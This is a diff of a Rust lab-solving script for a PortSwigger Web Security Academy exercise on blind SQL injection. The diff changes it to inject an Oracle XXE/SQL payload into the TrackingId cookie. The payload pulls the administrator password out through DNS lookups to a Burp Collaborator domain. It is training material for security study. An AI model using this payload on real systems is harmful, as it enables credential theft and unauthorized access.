@@ -4,11 +4,12 @@
 *
 * Date: 27/9/2023
 *
-* Lab: Blind SQL injection with out-of-band interaction
+* Lab: Blind SQL injection with out-of-band data exfiltration
 *
-* Steps: 1. Inject payload into 'TrackingId' cookie to make a DNS lookup
-*           to your burp collaborator domain
-*        2. Check your collaborator for incoming traffic
+* Steps: 1. Inject payload into 'TrackingId' cookie to extract administrator password 
+*           via DNS lookup
+*        2. Get the administrator password from your burp collaborator
+*        3. Login as administrator
 *
 ****************************************************************************************/
 #![allow(unused)]
@@ -32,9 +33,9 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0aeb009904a80679806a44fe004700dc.web-security-academy.net";
+    let url = "https://0aad007a03fae453807e030100f100e1.web-security-academy.net";
     // change this to your collaborator domain
-    let collaborator = "rlgst153v98gp4qym1jvzmq03r9jxbl0.oastify.com";
+    let collaborator = "lncmvv7xx3aaryssovlp1gsu5lbdz4nt.oastify.com";
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
@@ -44,12 +45,12 @@ fn main() {
         "TrackingId".yellow(),
     );
 
-    // payload to make a DNS lookup
-    let payload = format!("'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://{collaborator}/\"> %25remote%3b]>'),'/l') FROM dual)-- -");
+    // payload to extract administrator password via DNS lookup
+    let payload = format!("'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://'||(select password from users where username = 'administrator')||'.{collaborator}/\"> %25remote%3b]>'),'/l') FROM dual)-- -");
 
     print!(
         "{}",
-        "[*] Injecting payload to make a DNS lookup.. ".white(),
+        "[*] Injecting payload to extract administrator password via DNS lookup.. ".white(),
     );
     io::stdout().flush();
     // fetch the page with the injected payload
@@ -59,21 +60,14 @@ fn main() {
         .send()
         .expect(&format!(
             "{}",
-            "[!] Failed to make a DNS lookup with the injected payload".red()
+            "[!] Failed to fetch the page with the injected payload".red()
         ));
     println!("{}", "OK".green());
 
     println!(
         "{}",
-        "[#] Check the DNS lookup in your burp collaborator".white(),
+        "[#] Check your burp collaborator for the administrator password then login".white(),
     );
-    println!(
-        "{} {}",
-        "[#] Check your browser, it should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
-    )
 }
 
 /*******************************************************************
